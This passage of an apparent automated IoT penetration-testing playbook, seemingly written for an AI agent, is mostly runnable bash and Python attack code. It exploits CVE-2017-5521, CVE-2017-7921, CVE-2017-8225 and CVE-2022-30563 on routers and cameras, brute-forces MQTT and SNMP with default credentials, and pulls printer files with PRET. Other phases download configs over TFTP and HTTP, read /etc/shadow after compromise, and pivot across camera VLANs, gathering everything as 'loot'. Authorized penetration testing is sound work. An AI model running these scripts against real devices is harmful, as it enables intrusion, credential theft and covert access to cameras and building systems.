    data = s.recv(4096)
    if len(data) > 50:
        # Look for username/password strings in response
        text = data.decode('latin-1')
        print(f"  Response ({len(data)} bytes): checking for credentials...")
        # Credentials often appear as plaintext in response
        for i in range(len(data)-4):
            if data[i:i+4] == b'\x01\x00\x00\x21':
                ulen = data[i+4]
                username = data[i+5:i+5+ulen].decode('latin-1', errors='replace')
                print(f"  [CRED] Username: {username}")
        print(f"  Raw hex: {data[:80].hex()}")
    else:
        print(f"  Short response ({len(data)} bytes) — may not be vulnerable")
    s.close()
except Exception as e:
    print(f"  Error: {e}")
PYEOF
    fi

    # --- CVE-2017-5521: NETGEAR Password Recovery ---
    for port in 80 8080 443; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | grep -oiP '(?<=<title>)[^<]+')
        if echo "$title" | grep -qi "netgear\|wnr\|r6\|r7\|r8"; then
            echo "  [NETGEAR detected] $host:$port — Testing CVE-2017-5521..."
            RESULT=$(curl -sk --max-time 5 "http://$host:$port/passwordrecovered.cgi?id=1" 2>/dev/null)
            echo "$RESULT" | grep -qi "password\|admin" && {
                echo "  [CVE-2017-5521 HIT] Password exposed:"
                echo "$RESULT" | grep -iE "password|admin|user" | head -5
                echo "$host NETGEAR CVE-2017-5521" >> $ENG/loot/iot/cve_findings.txt
            } || echo "  Not vulnerable"
        fi
    done

    # --- CVE-2017-7921: Hikvision Auth Bypass (FW < 5.4.0) ---
    # Affects older Hikvision cameras — authentication bypass via crafted URL
    for port in 80 8080 443; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        proto="http"; [ "$port" = "443" ] && proto="https"

        # Bypass check 1: userList endpoint with hardcoded auth string
        RESULT=$(curl -sk --max-time 8 "$proto://$host:$port/Security/users?auth=YWRtaW46MTEM" 2>/dev/null)
        echo "$RESULT" | grep -qi "admin\|user\|password\|userName" && {
            echo "  [CVE-2017-7921] $host:$port VULNERABLE — auth bypass confirmed"
            echo "  Exposed users: $(echo $RESULT | grep -oP 'userName>[^<]+' | head -3)"
            echo "$host HTTP CVE-2017-7921 AUTH-BYPASS" >> $ENG/loot/iot/cve_findings.txt
        }

        # Bypass check 2: ISAPI Security users endpoint
        RESULT2=$(curl -sk --max-time 8 "$proto://$host:$port/ISAPI/Security/users" \
            -H "Authorization: Basic YWRtaW46MTEM" 2>/dev/null)
        echo "$RESULT2" | grep -qi "loginUser\|userName" && {
            echo "  [CVE-2017-7921] ISAPI endpoint exposed on $host:$port"
            echo "$host ISAPI CVE-2017-7921" >> $ENG/loot/iot/cve_findings.txt
        }

        # Config file download without auth (older models)
        RESULT3=$(curl -sk --max-time 8 -o /tmp/hik_cfg_$host.bin -w "%{http_code}" \
            "$proto://$host:$port/ISAPI/System/configurationData" 2>/dev/null)
        [ "$RESULT3" = "200" ] && {
            SZ=$(wc -c < /tmp/hik_cfg_$host.bin)
            [ "$SZ" -gt 100 ] && {
                echo "  [CVE-2017-7921] Config file downloaded: ${SZ} bytes — $proto://$host:$port/ISAPI/System/configurationData"
                strings /tmp/hik_cfg_$host.bin 2>/dev/null | grep -iE "password|admin|ssid|wifi" | head -5
                echo "$host CONFIG-LEAK CVE-2017-7921" >> $ENG/loot/iot/cve_findings.txt
            }
        }
    done

    # --- CVE-2017-8225: Netwave/GoAhead IP camera credential leak ---
    # Affects generic OEM cameras using GoAhead web server
    for port in 80 8080; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue

        # /proc/kcore contains credentials in memory-mapped process space
        RESULT=$(curl -sk --max-time 5 "http://$host:$port/proc/kcore" 2>/dev/null | \
            strings | grep -iE "admin|password|user" | head -5)
        [ -n "$RESULT" ] && {
            echo "  [CVE-2017-8225] $host:$port — /proc/kcore credential leak:"
            echo "$RESULT" | head -5 | sed 's/^/    /'
            echo "$host PROC-KCORE CVE-2017-8225" >> $ENG/loot/iot/cve_findings.txt
        }

        # /userinfo.htm exposes credentials directly
        RESULT2=$(curl -sk --max-time 5 "http://$host:$port/userinfo.htm" 2>/dev/null)
        echo "$RESULT2" | grep -qiE "user|pass|pwd|admin" && {
            echo "  [CVE-2017-8225] userinfo.htm exposed on $host:$port:"
            echo "$RESULT2" | grep -iE "user|pass|pwd" | head -5 | sed 's/^/    /'
            echo "$host USERINFO CVE-2017-8225" >> $ENG/loot/iot/cve_findings.txt
        }
    done

    # --- Amcrest CVE-2022-30563: Replay/nonce auth bypass ---
    for port in 80 8080; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        # Check for Amcrest digest auth nonce
        NONCE=$(curl -sk -I --max-time 5 "http://$host:$port/cgi-bin/snapshot.cgi" 2>/dev/null | \
            grep -i "WWW-Authenticate" | grep -oP 'nonce="\K[^"]+' | head -1)
        [ -n "$NONCE" ] && {
            echo "  [Amcrest] $host:$port — Digest auth nonce: $NONCE"
            echo "  Testing CVE-2022-30563 (stale nonce reuse bypass)..."
            # Try replaying with empty credentials using leaked nonce
            RESULT=$(curl -sk --max-time 5 "http://$host:$port/cgi-bin/snapshot.cgi" \
                --digest -u "admin:" \
                --header "Authorization: Digest username=\"admin\",realm=\"Login to admin\",nonce=\"$NONCE\",uri=\"/cgi-bin/snapshot.cgi\",qop=auth,nc=00000001,cnonce=\"deadbeef\",response=\"0000000000000000000000000000000000000000\"" \
                -o /tmp/amcrest_snap_$host.jpg -w "%{http_code}" 2>/dev/null)
            [ "$RESULT" = "200" ] && echo "  [!] Amcrest snapshot captured without valid auth!"
        }
    done

    # --- Printer exploitation ---
    if echo "$PORT_FILE" | grep -q "9100/tcp.*open"; then
        echo "  [Printer JetDirect] $host:9100 — Testing direct print access..."
        # Read printer config via PJL
        echo '@PJL INFO STATUS
@PJL INFO ID
@PJL FSQUERY FORMAT:"0:\\"
@PJL EOJ NAME="test"' | nc -w 5 $host 9100 2>/dev/null | head -10
    fi

done

echo ""
echo "CVE findings → $ENG/loot/iot/cve_findings.txt"
[ -s $ENG/loot/iot/cve_findings.txt ] && cat $ENG/loot/iot/cve_findings.txt || echo "(no CVEs confirmed)"
```

---

## Phase 5b — MQTT Broker Exploitation

MQTT is the standard IoT messaging protocol — an unauthenticated broker exposes all device telemetry, commands, and sometimes credentials:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 5b] MQTT Broker Exploitation ==="
echo ""

mkdir -p $ENG/loot/iot

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

# Install mosquitto clients if needed
which mosquitto_sub 2>/dev/null || apt-get install -y mosquitto-clients 2>/dev/null

for host in $IOT_HOSTS; do
    # Check MQTT ports (1883 plain, 8883 TLS, 9001 WebSocket)
    for port in 1883 8883 9001; do
        nc -zw2 $host $port 2>/dev/null || continue

        echo "  [MQTT] $host:$port — broker detected"

        # Try unauthenticated subscription to ALL topics (wildcard #)
        MQTT_OUTPUT=$(timeout 10 mosquitto_sub -h "$host" -p "$port" -t '#' -v \
            --keepalive 5 2>/dev/null | head -30)

        if [ -n "$MQTT_OUTPUT" ]; then
            echo "  [!] UNAUTHENTICATED MQTT ACCESS — all topics visible:"
            echo "$MQTT_OUTPUT" | head -15 | sed 's/^/    /'
            echo "$MQTT_OUTPUT" > $ENG/loot/iot/mqtt_${host//./_}_${port}.txt
            echo "$host MQTT $port UNAUTHENTICATED" >> $ENG/loot/iot/cve_findings.txt
        else
            echo "  Auth required — trying common credentials..."
            for cred in "admin:admin" "admin:password" "user:user" "mqtt:mqtt" \
                        "root:root" "guest:guest" "mosquitto:mosquitto"; do
                u=$(echo $cred | cut -d: -f1)
                p=$(echo $cred | cut -d: -f2)
                RESULT=$(timeout 6 mosquitto_sub -h "$host" -p "$port" -t '#' -v \
                    -u "$u" -P "$p" --keepalive 5 2>/dev/null | head -5)
                [ -n "$RESULT" ] && {
                    echo "  [+] MQTT creds: $u:$p"
                    echo "$RESULT" | head -5 | sed 's/^/    /'
                    echo "$host MQTT $port $u:$p" >> $ENG/loot/iot/found_creds.txt
                    break
                }
            done
        fi

        # Try to get broker info via $SYS topics (always public on many brokers)
        echo "  Broker system info:"
        timeout 5 mosquitto_sub -h "$host" -p "$port" -t '$SYS/#' -v 2>/dev/null | \
            head -10 | sed 's/^/    /'
    done
done

echo ""
echo "MQTT loot → $ENG/loot/iot/"
ls $ENG/loot/iot/mqtt_*.txt 2>/dev/null | head -5
```

---

## Phase 5c — Industrial Protocol Discovery (Modbus/BACnet/EtherNet-IP)

ICS/SCADA devices on network segments — read-only enumeration only (writing Modbus registers can cause physical damage):

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 5c] Industrial Protocol Discovery ==="
echo ""
echo "[!] WARNING: Only enumerate — never write to Modbus/BACnet without explicit authorization"
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

# --- Modbus TCP port 502 ---
echo "--- Modbus TCP (port 502 — ICS/SCADA PLCs) ---"
for host in $IOT_HOSTS; do
    nc -zw2 $host 502 2>/dev/null || continue

    echo "  [MODBUS] $host:502 — ICS device detected"
    echo "  [!] This is an industrial control system — ENUMERATE ONLY"

    # Read device identification (function code 43, MEI type 14)
    python3 << PYEOF
import socket

host = "$host"
try:
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, 502))
    # Modbus TCP Read Holding Registers (FC03) — unit 1, start 0, count 10
    req = bytes([0x00,0x01, 0x00,0x00, 0x00,0x06, 0x01, 0x03, 0x00,0x00, 0x00,0x0a])
    s.send(req)
    resp = s.recv(256)
    if len(resp) > 9:
        regs = [int.from_bytes(resp[9+i*2:11+i*2], 'big') for i in range(min(10,(len(resp)-9)//2))]
        print(f"    Holding registers 0-9: {regs}")
    # Device ID request (FC43)
    req2 = bytes([0x00,0x01, 0x00,0x00, 0x00,0x05, 0xFF, 0x2B, 0x0E, 0x01, 0x00])
    s.send(req2)
    resp2 = s.recv(256)
    if len(resp2) > 8:
        try:
            print(f"    Device ID response: {resp2[8:].decode('latin-1', errors='replace')[:80]}")
        except: pass
    s.close()
except Exception as e:
    print(f"    Error: {e}")
PYEOF

    echo "  Tool: pip3 install mbtget → mbtget -r3 -a 0 -l 10 $host  (read registers)"
    echo "  Tool: nmap -sV -p 502 --script modbus-discover $host"
done

# --- BACnet UDP port 47808 ---
echo ""
echo "--- BACnet (port 47808 UDP — building automation: HVAC/lighting/access) ---"
for host in $IOT_HOSTS; do
    python3 << PYEOF
import socket

host = "$host"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    # BACnet Who-Is broadcast (discover all BACnet devices)
    bacnet_whois = bytes([0x81,0x0b,0x00,0x0c, 0x01,0x20,0xff,0xff,0x00,0xff, 0x10,0x08])
    s.sendto(bacnet_whois, (host, 47808))
    try:
        data, addr = s.recvfrom(1024)
        print(f"  [BACNET] {addr[0]} — building automation device: {data.hex()[:40]}")
        print(f"  [!] HVAC/lighting/physical access control — report to client immediately")
    except socket.timeout:
        pass
    s.close()
except Exception as e:
    pass
PYEOF
done

# --- EtherNet/IP port 44818 ---
echo ""
echo "--- EtherNet/IP (port 44818 — Rockwell/Allen-Bradley PLCs) ---"
for host in $IOT_HOSTS; do
    nc -zw2 $host 44818 2>/dev/null && {
        echo "  [ETHERNET/IP] $host:44818 — industrial Ethernet PLC detected"
        echo "  Tool: python3 /opt/cpppo/cpppo.py --server $host list"
        nmap -sV -p 44818 --script enip-info $host 2>/dev/null | grep -E "vendor|product|revision|serial" | head -5
    }
done

---

## Phase 6 — SNMP Full Config Dump

Extract complete device configuration via SNMP:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 6] SNMP Full Config Dump ==="
echo ""

SNMP_HOSTS=$(grep -E "161" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

[ -z "$SNMP_HOSTS" ] && {
    echo "No SNMP hosts detected in port scan. Running UDP SNMP discovery..."
    SNMP_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
        grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
}

COMMUNITIES="public private community admin snmp cisco router switch camera"

for host in $SNMP_HOSTS; do
    echo "--- SNMP: $host ---"
    for community in $COMMUNITIES; do
        # Test if community string works
        RESULT=$(snmpwalk -v2c -c "$community" -t 3 "$host" sysDescr 2>/dev/null | head -1)
        if [ -n "$RESULT" ]; then
            echo "  [+] Community '$community' WORKS: $RESULT"

            # Full MIB dump
            echo "  Dumping full MIB..."
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                tee $ENG/loot/snmp/snmp_${host//./_}_${community}.txt | wc -l | \
                xargs -I{} echo "  {} OID entries dumped"

            # Extract interesting fields
            echo "  Key info extracted:"
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                grep -iE "sysName|sysLocation|sysContact|ifDescr|ipAdEntAddr|\
hrSWInstalledName|ssLoginUsers|wlanSsid|wepKey|wpaKey|passPhrase|\
printerMake|printerModel|firmware|version" | \
                head -30 | sed 's/^/    /'

            # Look for WiFi PSK (common in router SNMP MIBs)
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                grep -iE "passphrase|wpa.*key|psk|password" | \
                head -10 | sed 's/^/    [WiFi] /'

            echo "$host SNMP $community" >> $ENG/loot/iot/found_creds.txt
            break  # Found working community, move to next host
        fi
    done
    echo ""
done
```

---

## Phase 7 — Routersploit Scan

Automated vulnerability scanning with routersploit:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 7] Routersploit Automated Scanning ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u | head -10)

RSF=$(which rsf.py 2>/dev/null || echo "python3 /opt/routersploit/rsf.py")

for host in $IOT_HOSTS; do
    echo "--- Routersploit scan: $host ---"
    echo "use scanners/autopwn
set target $host
run
exit" | timeout 120 $RSF 2>/dev/null | \
    grep -E "Vulnerable|exploitable|\[+\]" | head -15
    echo ""
done
```

---

## Phase 7b — Printer Exploitation (PRET)

Printers are gold mines: stored credentials, scanned documents, internal network topology, filesystem access:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 7b] Printer Exploitation (PRET) ==="
echo ""

# Get PRET
PRET_PATH="/opt/pret"
if [ ! -f "$PRET_PATH/pret.py" ]; then
    echo "Installing PRET..."
    git clone https://github.com/RUB-NDS/PRET $PRET_PATH 2>/dev/null
    pip3 install colorama 2>/dev/null
fi
PRET="python3 $PRET_PATH/pret.py"

# Find printers from port scan
PRINTER_HOSTS=$(grep -B5 "9100/tcp.*open\|631/tcp.*open\|515/tcp.*open" \
    $ENG/scans/iot/iot_ports.txt 2>/dev/null | grep "Nmap scan report" | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

[ -z "$PRINTER_HOSTS" ] && {
    echo "No printers detected in port scan — check Phase 2 classification results."
}

for host in $PRINTER_HOSTS; do
    echo "--- Printer: $host ---"
    PORT_FILE=$(grep -A40 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -40)

    # IPP (Internet Printing Protocol) — port 631 — safe enumeration
    if echo "$PORT_FILE" | grep -q "631/tcp.*open"; then
        echo "  IPP (port 631) — enumerating print queue..."
        curl -sk "http://$host:631/printers/" 2>/dev/null | \
            grep -oP '(?<=<b>)[^<]+|href="[^"]*printer[^"]*"' | head -10
        curl -sk "http://$host:631/admin/" 2>/dev/null | \
            grep -qi "admin\|config\|password" && echo "  [!] IPP admin accessible"
    fi

    # Test all 3 PJL/PostScript/PCL printer languages via PRET
    for lang in pjl ps pcl; do
        echo "  Testing $lang language..."
        PRET_RESULT=$(timeout 15 $PRET $host $lang -q << 'PJLCMD' 2>/dev/null
id
ls
env
exit
PJLCMD
        )

        echo "$PRET_RESULT" | grep -qvE "^$|^\[" && {
            echo "  [$lang] Accessible on $host"
            echo "$PRET_RESULT" | head -10 | sed 's/^/    /'

            # PJL is most powerful — try filesystem access
            if [ "$lang" = "pjl" ]; then
                echo "  [PJL] Attempting filesystem access..."
                timeout 15 $PRET $host pjl -q << 'PJLFS' 2>/dev/null | head -20
fsdirlist volume=0:/
fsdirlist volume=0:/etc/
fsdownload volume=0:/etc/passwd
exit
PJLFS
                # Check for stored print jobs (may contain sensitive documents)
                timeout 10 $PRET $host pjl -q << 'PJLJOBS' 2>/dev/null | head -10
info variables
exit
PJLJOBS
            fi

            # PostScript — more dangerous, allows arbitrary code execution
            if [ "$lang" = "ps" ]; then
                echo "  [PS] Testing PostScript capabilities..."
                timeout 10 $PRET $host ps -q << 'PSCMD' 2>/dev/null | head -10
systemdict /statusdict known { statusdict begin revision end } if
() =
exit
PSCMD
            fi

            echo "$host PRINTER $lang ACCESSIBLE" >> $ENG/loot/iot/cve_findings.txt
            timeout 20 $PRET $host $lang -q << 'PJLDUMP' 2>/dev/null | \
                tee $ENG/loot/iot/printer_${host//./_}_${lang}.txt | wc -l | \
                xargs -I{} echo "  {} lines dumped to $ENG/loot/iot/printer_${host//./_}_${lang}.txt"
id
ls
env
exit
PJLDUMP
            break  # Found working language
        }
    done
    echo ""
done
```

---

## Phase 7c — Firmware & Config Extraction

Many IoT devices expose their configuration via TFTP or HTTP — extract for offline analysis and credential recovery:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 7c] Firmware & Config Extraction ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

mkdir -p $ENG/loot/iot/firmware

for host in $IOT_HOSTS; do
    echo "--- $host ---"

    # TFTP (port 69 UDP) — routers/switches often serve config via TFTP for auto-provisioning
    nc -uzw2 $host 69 2>/dev/null && {
        echo "  [TFTP] $host:69 — attempting config file download..."
        for filename in "startup-config" "running-config" "config.bin" "nvram" \
                        "backup.cfg" "default.cfg" "system.cfg" "router.conf" \
                        "switch.cfg" "firmware.bin"; do
            DEST="$ENG/loot/iot/firmware/tftp_${host//./_}_${filename}"
            timeout 8 tftp $host -m binary -c get "$filename" "$DEST" 2>/dev/null
            [ -f "$DEST" ] && [ "$(wc -c < $DEST)" -gt 50 ] && {
                SZ=$(wc -c < "$DEST")
                echo "  [+] TFTP: $filename ($SZ bytes)"
                # Extract credentials from config
                strings "$DEST" 2>/dev/null | \
                    grep -iE "password|passwd|secret|enable|key|community|user" | \
                    grep -v "^$" | head -10 | sed 's/^/      /'
            } || rm -f "$DEST" 2>/dev/null
        done
    }

    # HTTP config backup endpoints — vendor-specific
    for path in \
        "/backup.cfg" "/config.bin" "/settings.dat" "/configuration.bin" \
        "/admin/backup" "/cgi-bin/export_config.cgi" \
        "/ISAPI/System/configurationData" "/ISAPI/System/configurationFile" \
        "/api/backup" "/management/config/backup" \
        "/cgi-bin/download_config.asp" "/userRpm/config.bin" \
        "/goform/getSysConf" "/setting.dat" "/romfile.cfg" \
        "/config/download" "/nvrambackup"; do

        for port in 80 8080 443 8443; do
            code=$(curl -sk -o "$ENG/loot/iot/firmware/http_${host//./_}_${port}${path//\//_}.bin" \
                -w "%{http_code}" --max-time 8 "http://$host:$port$path" 2>/dev/null)
            DEST="$ENG/loot/iot/firmware/http_${host//./_}_${port}${path//\//_}.bin"
            [ "$code" = "200" ] && [ -f "$DEST" ] && {
                SZ=$(wc -c < "$DEST")
                [ "$SZ" -gt 100 ] && {
                    echo "  [+] Config: http://$host:$port$path ($SZ bytes)"
                    # Extract interesting strings from binary config
                    strings "$DEST" 2>/dev/null | \
                        grep -iE "password|passwd|ssid|wpa|wifi|admin|user|secret|key" | \
                        grep -v "^$" | head -8 | sed 's/^/      /'

                    # Check if it's a Cisco IOS config (plain text)
                    grep -qi "hostname\|interface\|enable secret" "$DEST" 2>/dev/null && {
                        echo "  [Cisco IOS config found!]"
                        grep -iE "enable (secret|password)|username|community" "$DEST" | head -5
                    }
                } || rm -f "$DEST" 2>/dev/null
            } || rm -f "$DEST" 2>/dev/null
        done
    done
done

echo ""
echo "Extracted configs → $ENG/loot/iot/firmware/"
ls -la $ENG/loot/iot/firmware/ 2>/dev/null | grep -v "^total" | head -20

# Run binwalk on binary configs to extract embedded firmware
which binwalk 2>/dev/null && {
    for f in $ENG/loot/iot/firmware/*.bin; do
        [ -f "$f" ] && [ "$(wc -c < $f)" -gt 1000 ] && {
            echo "  Running binwalk on $(basename $f)..."
            binwalk -e "$f" --directory="$ENG/loot/iot/firmware/extracted/" 2>/dev/null | head -10
        }
    done
}
```

---

## Phase 8 — Post-Compromise

After successful compromise, escalate and pivot:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 8] Post-Compromise Actions ==="
echo ""

echo "--- If camera/router shell obtained ---"
cat << 'EOF'
# Identify the device
id; uname -a; cat /etc/os-release 2>/dev/null; cat /proc/version 2>/dev/null

# Network interfaces (find other VLANs)
ip addr; ip route; ifconfig -a 2>/dev/null

# Scan from device's perspective (pivot to camera VLAN)
# Install nmap if not present (or use /dev/tcp bash scan):
for ip in $(seq 1 254); do
    (ping -c1 -W1 192.168.200.$ip &>/dev/null && echo "LIVE: 192.168.200.$ip") &
done; wait

# Extract stored credentials from device
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | \
    xargs grep -il "password\|passwd\|secret" 2>/dev/null | head -10

# Backup device config
cat /etc/config/wireless 2>/dev/null  # OpenWRT WiFi PSK
cat /etc/passwd 2>/dev/null           # User accounts
cat /etc/shadow 2>/dev/null           # Password hashes
EOF

echo ""
echo "--- Hikvision shell: extract camera stream credentials ---"
cat << 'EOF'
# After CVE-2021-36260 RCE on Hikvision:
curl -sk http://<camera-ip>/ISAPI/Security/users -u admin:admin
curl -sk http://<camera-ip>/ISAPI/System/deviceInfo
# Factory backup (may contain plain-text PSK):
curl -sk http://<camera-ip>/ISAPI/System/configurationData -u admin:admin > /tmp/config.bak
EOF

# Show summary of all findings
echo ""
echo "=== IoT Engagement Summary ==="
echo ""
echo "Devices discovered: $(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | wc -l)"
echo "RTSP streams: $(wc -l < $ENG/loot/rtsp/streams.txt 2>/dev/null || echo 0)"
echo "Default creds found: $(wc -l < $ENG/loot/iot/found_creds.txt 2>/dev/null || echo 0)"
echo "CVEs exploited: $(wc -l < $ENG/loot/iot/cve_findings.txt 2>/dev/null || echo 0)"
echo ""
echo "Next steps:"
echo "  → Spray found credentials across subnet: /pt-exploit <subnet>"
echo "  → MITM all camera traffic: /pt-mitm <iface>"
echo "  → Scan camera VLAN from pivot: /pt-net <camera-vlan-subnet>"
echo "  → AD attacks if Windows hosts found: /pt-ad <domain> <dc-ip> <creds>"

# Update engagement notes
cat >> $ENG/notes/engagement.md << NOTES

---
## IoT/Camera Scan
**Date**: $(date)
**Devices found**: $(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | wc -l)
**RTSP streams**: $(wc -l < $ENG/loot/rtsp/streams.txt 2>/dev/null || echo 0)
**Credentials**: $(wc -l < $ENG/loot/iot/found_creds.txt 2>/dev/null || echo 0)
**CVE hits**: $(cat $ENG/loot/iot/cve_findings.txt 2>/dev/null | head -5)
NOTES
```

---

## Execution Rules

- **Always run Phase 1+2 together** — OUI + port classification gives the attack priority
- **Run Phase 3b (ONVIF) after RTSP** — ONVIF reveals model/firmware/stream URI without guessing paths
- **Run Phase 3c (UPnP/SSDP) always** — finds devices invisible to ARP scan (printers, NAS, smart TVs)
- **RTSP first** (Phase 3) — a working RTSP stream is an instant deliverable in any report
- **CVEs before brute force** (Phase 5 before Phase 4) — CVE-2021-36260 needs no creds at all
- **CVE-2017-7921 on any Hikvision** — still unpatched on thousands of cameras worldwide
- **MQTT Phase 5b always** — unauthenticated brokers expose all device telemetry and commands
- **ICS/SCADA Phase 5c** — Modbus port 502 on internal segments = report-worthy critical finding
- **PRET Phase 7b on any printer** — filesystem access recovers stored credentials and print jobs
- **Phase 7c firmware extraction** — TFTP configs often contain plain-text WiFi PSK and enable secrets
- **SNMP is gold** — it can expose WiFi PSK, routing tables, VLANs — always try public/private
- **Routersploit** covers hundreds of router CVEs automatically — let it run
- **Post-compromise pivot** — cameras often sit on their own VLAN with access to other cameras; map it
- **Camera shells are noisy** — don't run loud scanners from camera; use passive discovery (ping sweep)
